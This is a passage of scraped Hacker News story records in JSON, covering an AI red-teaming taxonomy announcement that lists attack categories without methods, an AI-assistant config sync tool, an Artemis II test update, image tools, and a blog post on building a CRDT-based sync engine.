      "content": "I&#x27;ve been doing AI red teaming for the past year and kept running into the same problem: there&#x27;s no comprehensive catalog of how AI systems actually get broken.<p>So I built one. 122 distinct attack techniques across 11 categories, mapped to OWASP LLM Top 10 and MITRE ATLAS.<p>Categories:\n- Prompt Injection (20 attacks)\n- Jailbreaks (22)\n- System Prompt Leakage (12)\n- Vision&#x2F;Multimodal (12)\n- Excessive Agency &#x2F; Tool Abuse (12)\n- Multi-Turn Manipulation (8)\n- Sensitive Info Disclosure (10)\n- Supply Chain (8)\n- Vector&#x2F;Embedding Attacks (8)\n- Improper Output Handling (8)\n- Unbounded Consumption (2)<p>What&#x27;s included: IDs, names, descriptions, severity ratings, framework mappings, remediation guidance, code examples.<p>What&#x27;s NOT included: actual payloads, detection logic, model-specific success rates. This is a taxonomy, not an exploit database.<p>The goal is to give security teams a checklist and common language for AI security assessments.<p>Apache 2.0 licensed. PRs welcome for new techniques, framework mappings (NIST, ISO, etc.), and remediation improvements.<p><a href=\"https:&#x2F;&#x2F;github.com&#x2F;tachyonicai&#x2F;tachyonic-heuristics\" rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;tachyonicai&#x2F;tachyonic-heuristics</a>",
      "url": null,
      "author_username": "manuelnd",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:07.564506",
      "published_at": "2026-02-03T08:56:33",
      "scraped_at": "2026-02-03T09:03:07.564510",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46871017",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "57482e450a68c5974f38146542f3804b"
    },
    {
      "id": "9c1db210987026aa47468044dd74032d",
      "source": "hackernews",
      "source_id": "46871016",
      "title": "Show HN: AI Config â€“ Keep Claude / Codex / Gemini / OpenCode Configs in Sync",
      "content": "AI Config\n\nA unified configuration manager for AI coding assistants that keeps Claude Code,\nCodex, Gemini CLI, and OpenCode settings in sync.\n\nSeamlessly deploy consistent instructions, commands, skills, and MCP\nintegrations across agents through a single installer, centralizing setup and\nreducing maintenance.\n\nWhy\n\nAI tools all support configuration, but every agent uses a different format and\ndirectory layout. Keeping them in sync by hand is slow and error-prone.\n\nThis project:\n\nProvides one installer for multiple agents\n\nKeeps installation paths and updates consistent\n\nMakes maintenance easier by centralizing the source of truth\n\nShips curated best practices, agents, skills, and commands out of the box\n\nQuick Start\n\nThe installer will:\n\nAsk which agents to install\n\nAsk for install scope (project or home)\n\nAsk which MCP servers to install\n\nPrompt forGITHUB_PERSONAL_ACCESS_TOKENonly if GitHub MCP is selected\n\nWhat Gets Installed\n\nSources live in this repo and are copied into each agent's config:\n\ninstructions/global.md\n\ncommands/\n\nagents/\n\nskills/\n\nsettings/mcp.ts(GitHub, sequential-thinking, fetch)\n\nInstall Scope\n\nYou choose one scope for the entire run.\n\nProject (local)\n\nCreates dot-folders in the current project and places instructions in the\nproject root:\n\nClaude Code.claude/commands/,.claude/agents/,.claude/skills/.claude/settings.json(MCP)CLAUDE.md\n\n.claude/commands/,.claude/agents/,.claude/skills/\n\n.claude/settings.json(MCP)\n\nCLAUDE.md\n\nCodex.codex/skills/.codex/config.toml(MCP)AGENTS.md\n\n.codex/skills/\n\n.codex/config.toml(MCP)\n\nAGENTS.md\n\nGemini CLI.gemini/commands/,.gemini/agents/,.gemini/skills/.gemini/settings.json(MCP)GEMINI.md\n\n.gemini/commands/,.gemini/agents/,.gemini/skills/\n\n.gemini/settings.json(MCP)\n\nGEMINI.md\n\nOpenCode.opencode/commands/,.opencode/agents/,.opencode/skill/opencode.json(MCP)AGENTS.md\n\n.opencode/commands/,.opencode/agents/,.opencode/skill/\n\nopencode.json(MCP)\n\nAGENTS.md\n\nHome (global)\n\nUses the user config directories:\n\nClaude Code:~/.claude/\n\nCodex:~/.codex/\n\nGemini CLI:~/.gemini/\n\nOpenCode:~/.config/opencode/\n\nRequirements\n\nNode.js v22+\n\nMCP dependencies (only if you plan to use MCP):github-mcp-serveruv(foruvx)\n\ngithub-mcp-server\n\nuv(foruvx)\n\nSupported Features\n\nBuilt-in Features\n\nCommands\n\nSkills\n\nAgents\n\nMCP Integrations\n\nSee also\n\n@azat-io/eslint-config\n\n@azat-io/prettier-config\n\n@azat-io/stylelint-config\n\n@azat-io/typescript-config\n\nLicense\n\nMIT Â©Azat S.",
      "url": "https://github.com/azat-io/ai-config",
      "author_username": "azat_io",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://camo.githubusercontent.com/15a7459cd219a5fdea80048ffa5f7d66738cc508c9d9259acbffdd44103a3ff1/68747470733a2f2f696d672e736869656c64732e696f2f6e706d2f762f40617a61742d696f2f61692d636f6e6669672e7376673f636f6c6f723d666666266c6162656c436f6c6f723d666336306263",
          "alt": "Version"
        },
        {
          "type": "image",
          "url": "https://camo.githubusercontent.com/fa32292e45bdb6020def7146b1cd07e63043b420dedd1cebe9a83ec513e324b3/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6c6963656e73652d4d49542d3233323432382e7376673f636f6c6f723d666666266c6162656c436f6c6f723d666336306263",
          "alt": "GitHub License"
        },
        {
          "type": "image",
          "url": "https://raw.githubusercontent.com/azat-io/ai-config/main/assets/example-light.webp",
          "alt": "AI config interactive example"
        }
      ],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:08.434617",
      "published_at": "2026-02-03T08:56:32",
      "scraped_at": "2026-02-03T09:03:08.434628",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46871016",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "5e62bb3c6557732b1551ab0251b0d1f2"
    },
    {
      "id": "d2e0bff81ddb98ebb980897d6e386a44",
      "source": "hackernews",
      "source_id": "46871003",
      "title": "Artemis II Wet Dress Rehearsal: Test Terminated at T-5:15",
      "content": "Brandi Dean\n\nArtemis II Wet Dress Rehearsal: Test Terminated at T-5:15\n\nThe Artemis II wet dress rehearsal countdown was terminated at the T-5:15 minute mark due to a liquid hydrogen leak at the interface of the tail service mast umbilical, which had experienced high concentrations of liquid hydrogen earlier in the countdown, as well. The launch control team is working to ensure the SLS (Space Launch System) rocket is in a safe configuration and begin draining its tanks.\n\nBrandi Dean",
      "url": "https://www.nasa.gov/blogs/missions/2026/02/03/artemis-ii-wet-dress-rehearsal-test-terminated-at-t-515/",
      "author_username": "bookofjoe",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://assets.science.nasa.gov/dynamicimage/assets/science/esd/eo/images/iotd/2026/extreme-january-cold/coldair_gmao_20260129_th.jpg?w=1024",
          "alt": "Extreme January Cold"
        },
        {
          "type": "image",
          "url": "https://assets.science.nasa.gov/dynamicimage/assets/science/psd/solar-system/skywatching/2026/february/Andromeda%20above%20Mono%20Lake_credit_NASA_Preston%20Dyches_CC%20BY%20NC%202.0.jpg?w=1024",
          "alt": "Whatâ€™s Up: February 2026 Skywatching Tips from NASA"
        }
      ],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:08.472682",
      "published_at": "2026-02-03T08:55:37",
      "scraped_at": "2026-02-03T09:03:08.472692",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46871003",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "d84318ff92ed9734e3385e77a9b99c68"
    },
    {
      "id": "59e25414a9299f18498360edb5051812",
      "source": "hackernews",
      "source_id": "46870989",
      "title": "The Jule Programming Language",
      "content": "The Jule Programming Language",
      "url": "https://jule.dev/",
      "author_username": "PaulHoule",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:08.941439",
      "published_at": "2026-02-03T08:53:45",
      "scraped_at": "2026-02-03T09:03:08.941469",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46870989",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "23b0839f8a4e95321c3049fab333533a"
    },
    {
      "id": "a96539ba482db1df283adf3f40b3980a",
      "source": "hackernews",
      "source_id": "46870969",
      "title": "Show HN: ChibiGenerator â€“ Generate chibi-style characters from photos using AI",
      "content": "Transform Your Photos intoAdorable Chibi Art\n\nAI-powered photo-to-chibi generator that creates cute character images in seconds.Multiple artistic styles, instant generation, high-resolution output.\n\nâœ¨ Create your first chibi character for free\n\nAn AI-powered tool that transforms your photos into cute chibi character art with multiple artistic styles.\n\nAI Photo Analysis\n\nAdvanced AI analyzes facial features, expressions, and unique details to create personalized chibi images.\n\nMultiple Art Styles\n\nChoose from 3D renders, anime, cyberpunk, watercolor, claymation, and more artistic styles.\n\nInstant Generation\n\nGet your chibi character in seconds with our fast AI processing engine.\n\nHigh Resolution\n\nExport your chibi art in high resolution, perfect for printing or digital use.\n\nCommercial Use\n\nUse your generated chibi characters for personal and commercial projects without restrictions.\n\nEasy Sharing\n\nShare your chibi creations directly to social media or download for later use.\n\nCreate professional chibi art without any drawing skills - perfect for anime fans and creative designers.\n\nNo Drawing Skills Required\n\nVersatile Art Styles\n\nPersonal Gallery\n\nKey Features\n\nEverything you need to create amazing chibi character art from your photos.\n\nPhoto to Chibi\n\nUpload your photo and transform it into cute chibi character with AI-powered facial analysis.\n\nText to Image\n\nDescribe your chibi character and let AI generate it from your text description.\n\nMultiple Styles\n\nChoose from 3D, anime, cyberpunk, watercolor, claymation, and more artistic styles.\n\nImage Editor\n\nFine-tune your chibi character with built-in image editing tools.\n\nHigh Resolution Export\n\nDownload your chibi art in high resolution, perfect for any use case.\n\nPersonal Gallery\n\nSave and organize all your generated chibi characters in one place.\n\nFrequently Asked Questions\n\nHave questions? Contact us at support@chibigenerator.com\n\nWhat is a chibi character?\n\nHow does the AI photo-to-chibi conversion work?\n\nWhat photo formats are supported?\n\nCan I choose different art styles?\n\nWhat resolution are the generated images?\n\nCan I use the generated chibi art commercially?\n\nCreate Your Chibi Character Today\n\nTransform your photos into adorable chibi art in seconds.",
      "url": "https://www.chibigenerator.com/",
      "author_username": "hoxihan",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://pics.chibigenerator.com/samples/classic-chibi.webp",
          "alt": "Classic Chibi Style - Traditional cute character art"
        },
        {
          "type": "image",
          "url": "https://pics.chibigenerator.com/samples/kawaii-chibi.webp",
          "alt": "Kawaii Chibi Style - Super cute Japanese style"
        },
        {
          "type": "image",
          "url": "https://pics.chibigenerator.com/samples/anime-chibi.webp",
          "alt": "Anime Chibi Style - Japanese animation inspired"
        },
        {
          "type": "image",
          "url": "https://pics.chibigenerator.com/samples/3d-chibi.webp",
          "alt": "3D Chibi Style - Three-dimensional rendered characters"
        },
        {
          "type": "image",
          "url": "https://pics.chibigenerator.com/samples/kawaii-3d-chibi-vinyl-toys.webp",
          "alt": "Kawaii 3D Vinyl Toys - Collectible designer toy style"
        }
      ],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:09.450130",
      "published_at": "2026-02-03T08:51:45",
      "scraped_at": "2026-02-03T09:03:09.450142",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46870969",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "9a904bd460b07686fde201a37ad6b908"
    },
    {
      "id": "4fa6f2cfae2ccfc6171b8d495ea73c30",
      "source": "hackernews",
      "source_id": "46870960",
      "title": "Signal-First Architectures: Rethinking Front-End Reactivity",
      "content": "Computer Science > Software Engineering\n\nTitle:Signal-First Architectures: Rethinking Front-End Reactivity\n\nSubmission history\n\nAccess Paper:\n\nView PDF\n\nHTML (experimental)\n\nTeX Source\n\nReferences & Citations\n\nNASA ADS\n\nGoogle Scholar\n\nSemantic Scholar\n\nBibTeX formatted citation\n\nBookmark\n\nBibliographic and Citation Tools\n\nCode, Data and Media Associated with this Article\n\nDemos\n\nRecommenders and Search Tools\n\nAuthor\n\nVenue\n\nInstitution\n\nTopic\n\narXivLabs: experimental projects with community collaborators\n\narXivLabs is a framework that allows collaborators to develop and share new arXiv features directly on our website.\n\nBoth individuals and organizations that work with arXivLabs have embraced and accepted our values of openness, community, excellence, and user data privacy. arXiv is committed to these values and only works with partners that adhere to them.\n\nHave an idea for a project that will add value for arXiv's community?Learn more about arXivLabs.",
      "url": "https://arxiv.org/abs/2506.13815",
      "author_username": "buibuibui",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:09.515817",
      "published_at": "2026-02-03T08:51:07",
      "scraped_at": "2026-02-03T09:03:09.515848",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46870960",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "6ba54cfd52f8c1768a3ac87693cc19c1"
    },
    {
      "id": "a7154288b8b5dfbe914fe4938b12cc70",
      "source": "hackernews",
      "source_id": "46870958",
      "title": "Show HN: I built a client-side AI background remover (100% Free)",
      "content": "Image Background Remover\n\nProfessional-grade background removal with advanced controls.100%\n                Free & Private.\n\nClick to upload or drag & drop\n\nPNG, JPG, JPEG or WEBP â€¢ No size limit\n\nYour images are processed locally in your\n                    browser\n\nProcessing Your Image\n\nInitializing AI Model...\n\nFirst time: ~40MB download (cached for future\n                    use)\n\nOriginal\n\nResult\n\nExport Options\n\nInstant AI Processing\n\nState-of-the-art machine learning detects\n                subjects with pixel-perfect precision and removes backgrounds in under 3 seconds.\n\n100% Private & Secure\n\nAll processing happens locally in your browser.\n                No images are ever uploaded to servers. Your privacy is guaranteed.\n\nProfessional Controls\n\nAdvanced features including zoom, background\n                preview, quality controls, and multiple export formats for professional results.\n\nkey Features\n\nAI-Powered Background Removal in Seconds\n\n100% Client-Side Processing (Privacy Guaranteed)\n\nAdvanced Zoom Controls (50%-200%)\n\nBackground Preview Options (White, Black, Custom)\n\nExport as PNG, WebP, or JPG with Quality Control\n\nInteractive Before/After Comparison Slider\n\nNo File Size Limits or Watermarks\n\nWorks Offline After Initial Model Download\n\nTheProfessional AI Background Removeris an advanced, free tool designed for photographers, designers, e-commerce sellers, and anyone who needs to remove image backgrounds quickly and professionally.\n    Powered by cutting-edge machine learning technology that runs entirely in your browser.\n\nWhy Choose Our Background Remover?\n\nComplete Privacy:Unlike cloud-based tools, your images never leave your device. All AI processing happens locally in your browser, ensuring your photos remain 100% private and secure.\n\nProfessional Results:Advanced AI accurately detects subjects with pixel-perfect precision, preserving fine details like hair strands, fur, and complex edges.\n\nAdvanced Features:Interactive comparison slider, zoom controls (50%-200%), background preview options, quality controls, and multiple export formats (PNG/WebP/JPG).\n\nNo Limitations:Unlimited usage, no file size restrictions, no watermarks, and no signup required. Completely free forever.\n\nPerfect For\n\nE-Commerce:Create professional product photos with transparent backgrounds for online stores\n\nMarketing:Design eye-catching graphics, social media posts, and promotional materials\n\nPhotography:Remove distracting backgrounds from portraits and create stunning composites\n\nGraphic Design:Prepare images for logos, presentations, and design projects\n\nPersonal Projects:Create custom images for invitations, cards, and creative projects\n\nHow It Works\n\nUpload Your Image:Drag and drop or click to upload PNG, JPG, or WebP images (no size limit)\n\nAI Processing:Our advanced AI model analyzes and removes the background automatically (typically under 3 seconds)\n\nReview & Adjust:Use zoom controls, background preview options, and comparison tools to inspect results\n\nExport:Download your image as transparent PNG, WebP, or JPG with custom quality settings\n\nFirst-Time Setup:The AI model (~40MB) downloads automatically on your first use and is cached permanently. \n    After the initial download, the tool works instantly - even offline!\n\nFrequently Asked Questions\n\nOur tool uses state-of-the-art machine learning models that run entirely in your browser. The AI analyzes your image, detects the main subject (people, objects, etc.), and intelligently removes the background while preserving fine details like hair edges and complex shapes. The entire process happens locally on your device.\n\nAbsolutely! Unlike other background removal tools that upload your photos to cloud servers, our tool processes everything locally in your browser. Your images never leave your device, ensuring 100% privacy and security. No data is stored, tracked, or sent to any server.\n\nYou can upload PNG, JPG, JPEG, and WebP images of any size. For export, you can download your result as a transparent PNG (recommended), WebP (smaller file size), or JPG with a custom background color. Quality controls are available for WebP and JPG formats.\n\nYes! Our background remover works excellently for product photos, creating clean transparent backgrounds perfect for e-commerce platforms like Shopify, Amazon, or eBay. You can preview your product against different backgrounds (white, black, or custom colors) before downloading.\n\nNo limitations! There are no file size restrictions, no watermarks on output images, no daily usage limits, and no signup required. The tool is completely free and unlimited. The only requirement is the initial AI model download (~40MB) which is cached for future use.\n\nFor optimal results: (1) Use high-resolution images with clear subject boundaries, (2) Ensure good contrast between subject and background, (3) Use the zoom controls to inspect edge quality, (4) Try different background preview options to verify transparency, (5) Adjust quality settings when exporting to balance file size and image quality.\n\nYes! You retain full rights to your processed images. Our tool simply removes the background from your photos - the copyright and usage rights remain entirely with you. You can use the results for personal projects, commercial products, marketing materials, or any other purpose.\n\nYes! The tool is fully responsive and works on smartphones and tablets. The touch-enabled comparison slider makes it easy to inspect results on mobile devices. However, processing performance depends on your device's capabilities - newer devices will process images faster.\n\nRelated\n                Tools\n\nImage Resizer\n\nFree Online Image Resizer. Resize JPG, PNG, and WebP images by pixels or percentage. Maintain aspect ratio and download high-quality images instantly.\n\nImage Compressor\n\nAdvanced Image Compressor. Compress PNG, JPG, and WebP images without losing quality. Reduce file size significantly for faster website loading speeds.\n\nPNG/JPG/WebP Converter\n\nConvert Images to Different Formats. Instantly convert between PNG, JPG, and WebP. Batch processing with 100% client-side privacy for your photos.\n\nSignature Generator\n\nFree Online Digital Signature Generator. Draw your signature or generate one from text. Download transparent PNG for use in documents and emails.\n\nFind this tool helpful?\n\nIf these tools save you time, consider supporting the development. Your support helps keep the server\n                running and new tools coming!",
      "url": "https://toolsaid.com/image-background-remover",
      "author_username": "raihaninfo",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:10.438160",
      "published_at": "2026-02-03T08:50:50",
      "scraped_at": "2026-02-03T09:03:10.438179",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46870958",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "35ad0069c0a1bf8ddac47838850122c8"
    },
    {
      "id": "1771a8273bd15cda6498b852ad03971c",
      "source": "hackernews",
      "source_id": "46870943",
      "title": "A collection of packages for developing web applications with Node.js",
      "content": "Radically Straightforward\n\nRadically Straightforwardis a collection of packages for developing web applications with Node.js. It covers everything from connecting to a database all the way to packaging the application for distribution. The packages were designed to be used together, but most of them can be useful on their own as well.\n\nWeâ€™re still working on the high-level documentation telling the overarching story of Radically Straightforward and helping users get started, but the low-level documentation of each package is already in place you may refer toREADMEs under the respective directories.\n\nInstallation\n\nGuides\n\nDeployment\n\nDevelopment",
      "url": "https://github.com/radically-straightforward/radically-straightforward",
      "author_username": "mfbx9da4",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://github.githubassets.com/assets/patreon-96b15b9db4b9.svg",
          "alt": "patreon"
        }
      ],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:10.990441",
      "published_at": "2026-02-03T08:49:27",
      "scraped_at": "2026-02-03T09:03:10.990451",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46870943",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "6df333b6a1bf8ab320e6341d3fb9513a"
    },
    {
      "id": "52fe20ef162927c4f8abe7e04d27dff7",
      "source": "hackernews",
      "source_id": "46870940",
      "title": "Building a Sync Engine from Scratch",
      "content": "When I started buildingColanode, I had two core principles:\n\nOpen source and easy to self-host, with the goal of making Colanode the default collaboration infrastructure.\n\nFast and always available (even offline), because it is the type of app you use every day.\n\nThese goals shaped most of the technical decisions. Around that time, I discovered the local-first movement: your data lives on your device first and syncs to the server in the background. That sounded perfect. I had never built a local-first app, so I figured how hard could it be? Right? Right?\n\nFour rewrites later, we have a version that covers most cases but still leaves room for improvement. This post explains what we built and why.\n\nI started by researching the space, watching videos and reading blogs by teams that built sync engines (Linear, Figma, Notion, etc.), and digging into common architectures and failure modes. I also reviewed existing open-source sync engines, but most of them came with constraints I did not want to inherit in Colanode. That is why I decided to build one from scratch.\n\nFirst, the stack. I wanted it boring and simple: a TypeScript monorepo with Node.js on the server, Electron + React + SQLite for the desktop app, Postgres for data, Redis for cache and background jobs, and S3 for file storage. The sync engine sits on top of this stack without introducing new dependencies.\n\nData model\n\nColanode supports chats, channels, pages, databases, views, records, folders, and files. All of it needs to work offline-first. The first challenge was designing a data model that is simple to query and extend.\n\nWe settled on the concept of a Ã¢Â€ÂœnodeÃ¢Â€Â which represents anything a user can create in Colanode (and the origin of the name). All nodes share common fields plus a nestedattributesobject that varies by node type. This design is inspired by the ProseMirror document schema we use in the editor.\n\nFor example, a channel node looks like this:\n\nMeanwhile a message node looks like this:\n\nTheattributesobject holds the actual content. We maintain a registry of node attribute schemas using Zod, which provides validation and type safety. This design is easy to extend: we simply add a new node type to the registry and the sync engine handles everything else. All that remains is building the UI for the new node type.\n\nFor example, the schema for defining a record node looks like this:\n\nConflict resolution\n\nMultiple users can make changes to the same node concurrently. One user updates one field while another updates a different field on separate devices at the same time. Even without true concurrency, conflicts arise: a user can make a change while offline, and by the time they reconnect, another userÃ¢Â€Â™s changes have already synced to the server. This brings us to conflict resolution algorithms.\n\nThere are different types of algorithms, but the most common are:\n\nLast write wins. Whatever arrives last becomes the stored value. Simple and common, but it loses intent.\n\nThree-way merge (diff/patch), typically used in version control systems like Git.\n\nOperational Transformation (OT), the classic approach used in collaborative editors like Google Docs.\n\nConflict-free Replicated Data Types (CRDTs), which provide convergence guarantees without a central authority.\n\nGiven our requirements (offline-first and concurrent edits) we chose a hybrid approach: CRDTs for conflict resolution, plus a central server for validation, authorization, and relaying changes (an approach Figma uses as well). Multiple CRDT implementations exist, such asAutomergeandYjs. At the time, Yjs had better performance and storage usage based on benchmarks, so we chose it for Colanode.\n\nYjs provides a set of data structures that sync automatically. In our case, each node corresponds to one Yjs Document. Yjs provides a data structure called YMap, a key-value which we use for storing node attributes. Map values can be nested data structures with their own sync logic, such as the Text data structure or the YArray. Here is how we represent record attributes in Yjs:\n\nAll changes in Yjs produce an update, an encoded binary array containing the operations performed. You can apply that update to any remote YDoc in any order and get the same final result. Operations are also idempotent, meaning you can apply the same operation multiple times without errors. Here is what happens when a user updates the name of a product:\n\nAs you can see, there is a lot happening under the hood. Doing all of this manually would require a lot of boilerplate and would be error-prone. To avoid that, we built an abstraction on top of Yjs and Zod schemas that automatically applies changes given an attributes object and its schema. The abstraction chooses the right Yjs data structures based on the schema and performs the correct operations. It also compares values to avoid emitting updates when nothing actually changed. There are additional tricks around arrays, deep nesting, and reordering, but we will save those for another post.\n\nLocal sync flow\n\nWhat happens when a user creates a record in Colanode? First, the UI builds the necessary attributes from the form and sends them to the local node service, which handles storage and prepares the data for sync. This service uses SQLite for storing data and serving it to the UI.\n\nThere are four main tables the client uses for nodes and sync:\n\nnodes: last resolved attributes, used for query and UI rendering.\n\nnode_updates: local updates that are not confirmed by the server yet.\n\nnode_states: the compacted, server-confirmed state for each node.\n\nmutations: pending changes not synced with the server yet (create, update, delete).\n\nThe node service generates a new id, builds a Y.Doc from the attributes, and produces an update (a binary array). We assign the update a unique id, insert it intonode_updates, and create a row inmutationsqueued for sync. Once that is done, the UI is updated optimistically and the record is visible immediately.\n\nThe background sync service retrieves pending mutations and sends them to the server. It retries with exponential backoff when the device is offline or the server is unavailable, debounces rapid changes, and batches mutations. When the server confirms a mutation, the client deletes it frommutationsand continues.\n\nUpdates follow the same pattern. The UI sends new attributes to the local node service, which loads the current node state fromnode_states, applies any pendingnode_updates, rebuilds the Y.Doc, and then applies the new changes. That produces a new update, and the service updatesnodes, inserts intonode_updates, and appends a new mutation.\n\nDeletes are handled similarly: we remove the node fromnodesand insert a delete mutation. Thenode_updatesandnode_statesentries are cleared after the deletion is confirmed, which also allows us to roll back if needed.\n\nSpeaking of rollbacks: if a mutation fails after multiple retries (for example, due to invalid data or authorization issues), we revert it:\n\nCreate: delete everything related to the node.\n\nUpdate: delete the failednode_updateand rebuild attributes fromnode_statesand remainingnode_updatesintonodes.\n\nDelete: recreate the node locally fromnode_statesandnode_updates, then restore it intonodes.\n\nServer sync flow\n\nWhen a node update mutation arrives at the server, we perform a similar flow. First, we run validation and authorization checks. There are two main tables in Postgres for nodes and sync:\n\nnodes: last resolved attributes, used for queries and filtering.\n\nnode_updates: all updates performed for a node.\n\nWe use the same YDoc abstraction (one benefit of a full-stack TypeScript monorepo), but in reverse. We apply the update to a new YDoc and retrieve the attributes from it. If validation passes, we insert the attributes and metadata into thenodestable, store the update innode_updates, and confirm the mutation to the client.\n\nA crucial detail innode_updatesis therevisioncolumn: a globally ordered sequence of updates that is assigned by a Postgres sequence. We use it for two things. First, it prevents race conditions during server-side updates: we store the last committed revision innodesand check it before writing so we do not overwrite a node that was updated concurrently. Second, it provides the ordered log needed to stream updates to clients, which we will cover next.\n\nYou might wonder how large thenode_updatestable can get. The answer is: quite large. This is a tax you pay for using CRDTs. In our case, the benefits outweigh the storage cost. Beyond full offline capability, this approach provides a complete, granular history of changes for each node, something users often want.\n\nBased on usage patterns from our cloud users, we are implementing several optimizations. First, we are testing a background job that merges multiple updates on the same node within a short timespan into a single compacted update. This reduces the number of rows and can also decrease the size of the Yjs updates, depending on the merged operations.\n\nAnother pattern we have observed is users working on a single document for extended periods, resulting in a large number of updates for that node. Rebuilding the YDoc from all changes becomes slow. Our next optimization is to introduce a compacted final state (similar to what we do on the client) for nodes with many updates.\n\nClient-server sync flow\n\nWe have covered how changes are stored locally and on the server. The next question is: how do we ensure all changes reach all clients that should receive them? This is the most challenging part of the sync engine, guaranteeing that all changes are delivered in the correct order. Clients can go offline for days and need to receive all changes that occurred during that time. Users might also log in on a new device and need their complete data locally.\n\nThe best analogy for ColanodeÃ¢Â€Â™s sync mechanism is the Kafka consumer pattern. Each client is a consumer that reads all node updates sequentially and syncs them locally. Whe",
      "url": "https://hakanshehu.com/posts/building-the-colanode-sync-engine/",
      "author_username": "hakanshehu",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 1,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:11.326273",
      "published_at": "2026-02-03T08:49:20",
      "scraped_at": "2026-02-03T09:03:11.326284",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46870940",
        "kids_count": 1,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "1ae564d126fa9e775ab866c3392ceacf"
    },
    {
      "id": "d31ca007acda728417cf46910d36af66",
      "source": "hackernews",
      "source_id": "46870939",
      "title": "Philosophy of Science Is Fascinating",
      "content": "Interesting things happen at intersections.\nThatâ€™s my answer when people ask me how I find interesting problems to work on.\nItâ€™s one of the things that I love about computational biology - molecular biology, disease etiology, genetics, computer science, statistics, chemistry, math, and technology all collide.\nBut many other areas of academic research also have this unique collision of expertise and traditions, too.\n\nA recent area of intersection that has caught my interest is the philosophy of science.\nSince the Enlightenment, people have noted that mathematicians and scientists do a kind of academic research that seems different from other disciplines.\nWhat differentiates these disciplines?\nWhat makes them unique compared to other historical traditions?\nIs there a clear demarcation line between scientific thinking and ethics or theology?\nWhen does something cross the line from science into pseudo-science?\n\nAnswers to these questions are surprisingly more complicated than you might think.\nThey are certainly more difficult to answer than popular science media would lead you to believe.\nI donâ€™t want to recite a history of the philosophy of science, here.\nIâ€™m not a historian and nor am I a philosopher, so I donâ€™t think Iâ€™d be of much help, there.\nWhat I do want to talk about is some of the philosophers I have read and how these philosophies connect to some of my experiences today.\n\nFalsificationism\n\nIf youâ€™ve heard anything about the philosophy of science, youâ€™ve probably heard ofKarl Popperand his philosophy of â€œfalsificationâ€.\nThe idea is that a scientific theory should be rejected if it makes predictions that do not match what is observed in nature.\nOne of the inspiring ideas behind this philosophy was the success ofAlbert Einsteinâ€™s general relativity and its accurate prediction of Mercuryâ€™s orbit around the sun, especially compared toIsaac Newtonâ€™s inverse-square law of gravity.\nNewtonâ€™s theory made a prediction about Mercuryâ€™s orbit, which wasnâ€™t correct, even when accounting for technical limitations of the measurement devices.\nNewtonâ€™s theory had been â€œfalsifiedâ€ by experimental 